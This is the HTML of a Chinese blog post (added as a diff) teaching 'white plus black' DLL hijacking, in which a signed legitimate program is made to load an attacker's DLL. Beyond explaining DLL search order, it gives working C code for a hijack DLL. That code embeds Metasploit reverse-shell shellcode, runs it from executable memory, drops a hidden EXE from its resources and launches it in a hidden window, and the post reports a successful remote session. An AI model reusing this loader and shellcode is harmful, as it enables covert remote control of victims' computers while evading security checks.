@@ -1,0 +1,564 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="b1ackie">
+  <meta name="keywords" content="">
+  <meta name="description" content="前言DLL劫持就是劫持或者替换掉正常的DLL，欺骗正常程序加载预先准备好的恶意DLL。其中有一种手法叫“白加黑”，就是一个“白”的EXE加载“黑“的DLL。 原理DLL劫持的原理主要就是windows下加载DLL的顺序。在加载DLL的时候，系统会依次从以下六个位置去查找所需要的DLL文件  程序所在目录 系统目录 16位系统目录 Windows目录 当前目录 PATH环境变量中的各个目录  只要可">
+<meta property="og:type" content="article">
+<meta property="og:title" content="“白加黑”DLL劫持">
+<meta property="og:url" content="https://b1ackie.cn/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/index.html">
+<meta property="og:site_name" content="b1ackie&#39;blog">
+<meta property="og:description" content="前言DLL劫持就是劫持或者替换掉正常的DLL，欺骗正常程序加载预先准备好的恶意DLL。其中有一种手法叫“白加黑”，就是一个“白”的EXE加载“黑“的DLL。 原理DLL劫持的原理主要就是windows下加载DLL的顺序。在加载DLL的时候，系统会依次从以下六个位置去查找所需要的DLL文件  程序所在目录 系统目录 16位系统目录 Windows目录 当前目录 PATH环境变量中的各个目录  只要可">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://b1ackie.cn/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/1.png">
+<meta property="og:image" content="https://b1ackie.cn/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/2.png">
+<meta property="og:image" content="https://b1ackie.cn/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/3.png">
+<meta property="og:image" content="https://b1ackie.cn/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/1.gif">
+<meta property="og:image" content="https://b1ackie.cn/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/4.png">
+<meta property="og:image" content="https://b1ackie.cn/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/5.png">
+<meta property="og:image" content="https://b1ackie.cn/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/6.png">
+<meta property="og:image" content="https://b1ackie.cn/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/7.png">
+<meta property="og:image" content="https://b1ackie.cn/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/2.gif">
+<meta property="article:published_time" content="2021-10-11T08:50:39.000Z">
+<meta property="article:modified_time" content="2021-10-12T08:42:58.938Z">
+<meta property="article:author" content="b1ackie">
+<meta property="article:tag" content="DLL劫持">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://b1ackie.cn/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/1.png">
+  
+  <title>“白加黑”DLL劫持 - b1ackie&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/vs2015.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"b1ackie.cn","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="b1ackie'blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>b1ackie&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/post%E8%83%8C%E6%99%AF%E5%9B%BE.jfif') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="“白加黑”DLL劫持">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-10-11 16:50" pubdate>
+        2021-10-11 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      6k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      19 分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">“白加黑”DLL劫持</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2021-10-12 下午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>DLL劫持就是劫持或者替换掉正常的DLL，欺骗正常程序加载预先准备好的恶意DLL。其中有一种手法叫“白加黑”，就是一个“白”的EXE加载“黑“的DLL。</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>DLL劫持的原理主要就是windows下加载DLL的顺序。在加载DLL的时候，系统会依次从以下六个位置去查找所需要的DLL文件</p>
+<ol>
+<li>程序所在目录</li>
+<li>系统目录</li>
+<li>16位系统目录</li>
+<li>Windows目录</li>
+<li>当前目录</li>
+<li>PATH环境变量中的各个目录</li>
+</ol>
+<p>只要可以将准备好的DLL放在特定的目录下，先于原先的DLL被加载，就会实现劫持。</p>
+<p>不过在win7之后，微软为了防御DLL劫持，将一些容易被劫持的DLL写入了一个注册表中HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs，在这里的DLL都会被禁止从程序所在目录下调用，只可以在系统目录下调用。</p>
+<p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/1.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="一些要求"><a href="#一些要求" class="headerlink" title="一些要求"></a>一些要求</h2><p>要实现“白加黑”的话，DLL最好是有很少的导出函数，或是对于一个白应用来说不是必需的DLL，没有此DLL还是可以打开程序正常运行，这样的话都不需要进行函数的转发。白应用调用的自己编写的DLL最好也比较少，这样更加方便。</p>
+<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p>在这里可以使用工具来进行查找，使用Process Monitor工具。</p>
+<p>根据刚才所讲，那么我们理清一下思路，现在需要找到一个可以使用的DLL，那么将某个白应用放在一个目录下，然后使用工具观察其加载DLL的情况，如果它尝试从当前目录下去加载某个DLL，那么可以尝试构造同名DLL来进行劫持。</p>
+<p>在Process Monitor中设置一些过滤条件</p>
+<blockquote>
+<p><strong>Include</strong></p>
+<p>Operation is CreateFile</p>
+<p>Operation is LoadImage</p>
+<p>Path contains .dll</p>
+<p><strong>Exclude</strong></p>
+<p>Result is SUCCESS</p>
+</blockquote>
+<p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/2.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里我随便在网上找了一个某播放器的安装包，是一个带数字签名的白应用，其次这个安装包也不带任何DLL。可以看到在启动它的时候，尝试在我这个123目录下寻找几个DLL，那么可以尝试伪造一下。</p>
+<p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>写一个弹计算器的DLL，然后改名为SHFOLDER.dll，具体哪个DLL名字可以用，还需要去实际测试，我试第一个VERSION并不可行，用这个是可以的。</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        WinExec(<span class="hljs-string">&quot;calc.exe&quot;</span>, SW_NORMAL);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>点击运行一下查看效果，成功弹出了计算机。</p>
+<p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/1.gif" srcset="/img/loading.gif" lazyload></p>
+<p>然后在测试的时候，后台的浏览器一直是开着的，查看Process Monitor的时候，发现了一个浏览器的更新程序也在寻找一个DLL，这个也可以拿来利用， 并且这个程序很小，只有一百五十多KB。</p>
+<p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>现在来尝试一下利用MSF生成一个远控木马，来操作下。</p>
+<p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/5.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后把它写进DLL中，让DLL启动直接执行这段shellcode。</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> shellcode[] =<br><span class="hljs-string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30\x89\xe5&quot;</span><br><span class="hljs-string">&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;</span><br><span class="hljs-string">&quot;\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49&quot;</span><br><span class="hljs-string">&quot;\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78&quot;</span><br><span class="hljs-string">&quot;\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x50\x8b\x58\x20\x01\xd3&quot;</span><br><span class="hljs-string">&quot;\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xc1&quot;</span><br><span class="hljs-string">&quot;\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24&quot;</span><br><span class="hljs-string">&quot;\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c&quot;</span><br><span class="hljs-string">&quot;\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59&quot;</span><br><span class="hljs-string">&quot;\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d&quot;</span><br><span class="hljs-string">&quot;\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26&quot;</span><br><span class="hljs-string">&quot;\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68&quot;</span><br><span class="hljs-string">&quot;\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\xca\x84\x68\x02&quot;</span><br><span class="hljs-string">&quot;\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span><br><span class="hljs-string">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61&quot;</span><br><span class="hljs-string">&quot;\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span><br><span class="hljs-string">&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83&quot;</span><br><span class="hljs-string">&quot;\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a&quot;</span><br><span class="hljs-string">&quot;\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57&quot;</span><br><span class="hljs-string">&quot;\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00&quot;</span><br><span class="hljs-string">&quot;\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68&quot;</span><br><span class="hljs-string">&quot;\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff&quot;</span><br><span class="hljs-string">&quot;\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb&quot;</span><br><span class="hljs-string">&quot;\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    LPVOID Memory = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(Memory, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode));<br>    ((<span class="hljs-keyword">void</span>(*)())Memory)();<br>&#125;<br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        run();<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>然后在服务端开启监控，这个时候就出现了问题，这边好像是一直发包发不过去，就没办法了，我也不知道是哪里出问题了。但是我用一个EXE进行测试，发现是没有任何问题的，于是，我就想到不如把EXE放在DLL的资源节里，然后“白加黑”释放资源，再打开exe好了。</p>
+<p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/6.png" srcset="/img/loading.gif" lazyload></p>
+<p>将shellcode编写成一个exe，然后把它放到DLL的资源节中，当加载DLL的时候释放此exe在运行它。</p>
+<p>释放资源</p>
+<p>释放资源这里，一定一定要注意DLL释放资源和EXE是不同的，FindResource这几个函数第一个参数千万不能是NULL，这里要是DLL的句柄，我在这卡了好久，才发现问题。</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">BOOL <span class="hljs-title">Free</span><span class="hljs-params">(UINT uResourceId, WCHAR* szResourceType, <span class="hljs-keyword">char</span>* szFileName)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-comment">//如果是DLL的资源释放，必须加载DLL的句柄！！！！</span><br>	HMODULE hDll = GetModuleHandle(<span class="hljs-string">L&quot;goopdate.dll&quot;</span>);<br>	<span class="hljs-comment">// 找到资源</span><br>	HRSRC hRsrc = FindResource(hDll, MAKEINTRESOURCE(uResourceId), szResourceType);<span class="hljs-comment">//第一个参数不能是NULL，不然的话无法搜索到资源，其他同样</span><br>	<span class="hljs-keyword">if</span> (hRsrc == <span class="hljs-literal">NULL</span>)<br>	&#123;<br>		<span class="hljs-keyword">return</span> FALSE;<br>	&#125;<br>	<span class="hljs-comment">// 获取资源大小</span><br>	DWORD dwSize = SizeofResource(hDll, hRsrc);<br>	<span class="hljs-keyword">if</span> (dwSize &lt;= <span class="hljs-number">0</span>)<br>	&#123;<br>		<span class="hljs-keyword">return</span> FALSE;<br>	&#125;<br>	<span class="hljs-comment">// 载入资源</span><br>	HGLOBAL hGlobal = LoadResource(hDll, hRsrc);<br>	<span class="hljs-keyword">if</span> (hGlobal == <span class="hljs-literal">NULL</span>)<br>	&#123;<br>		<span class="hljs-keyword">return</span> FALSE;<br>	&#125;<br>	<span class="hljs-comment">// 锁定资源，并返回指向资源第一字节的指针</span><br>	LPVOID lpRes = LockResource(hGlobal);<br>	<span class="hljs-keyword">if</span> (lpRes == <span class="hljs-literal">NULL</span>)<br>	&#123;<br>		<span class="hljs-keyword">return</span> FALSE;<br>	&#125;<br>	<span class="hljs-comment">//创建一个隐藏文件</span><br>	HANDLE hFile = CreateFileA(szFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="hljs-literal">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, <span class="hljs-literal">NULL</span>);<br>	<span class="hljs-keyword">if</span> (hFile == <span class="hljs-literal">NULL</span>)<br>	&#123;<br>		<span class="hljs-keyword">return</span> FALSE;<br>	&#125;<br>	DWORD dwWriten = <span class="hljs-number">0</span>;<br>	BOOL bRes = WriteFile(hFile, lpRes, dwSize, &amp;dwWriten, <span class="hljs-literal">NULL</span>);<br>	<span class="hljs-keyword">if</span> (bRes == FALSE || dwWriten &lt;= <span class="hljs-number">0</span>)<br>	&#123;<br>		<span class="hljs-keyword">return</span> FALSE;<br>	&#125;<br>	CloseHandle(hFile);<br>	CloseHandle(hGlobal);<br>	CloseHandle(hRsrc);<br>	<span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>启动进程</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">BOOL <span class="hljs-title">Create</span><span class="hljs-params">(WCHAR* szFileName)</span></span><br><span class="hljs-function"></span>&#123;<br>	STARTUPINFO si;<br>	PROCESS_INFORMATION pi;<br>	ZeroMemory(&amp;si, <span class="hljs-keyword">sizeof</span>(si));<br>	ZeroMemory(&amp;pi, <span class="hljs-keyword">sizeof</span>(pi));<br>	si.cb = <span class="hljs-keyword">sizeof</span>(si);<br>	si.dwFlags = STARTF_USESHOWWINDOW;<br>	si.wShowWindow = SW_HIDE;<br>	<span class="hljs-comment">//隐藏窗口启动释放的exe</span><br>	BOOL flag = CreateProcess(szFileName, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi);<br>	<span class="hljs-keyword">if</span> (flag)<br>	&#123;<br>		CloseHandle(pi.hThread);<br>		CloseHandle(pi.hProcess);<br>		<span class="hljs-keyword">return</span> TRUE;<br>	&#125;<br>	<span class="hljs-keyword">return</span> FALSE;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>然后编译，再改名为要劫持的DLL就可以了。</p>
+<p>双击运行后，成功上线。</p>
+<p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/7.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/2.gif" srcset="/img/loading.gif" lazyload></p>
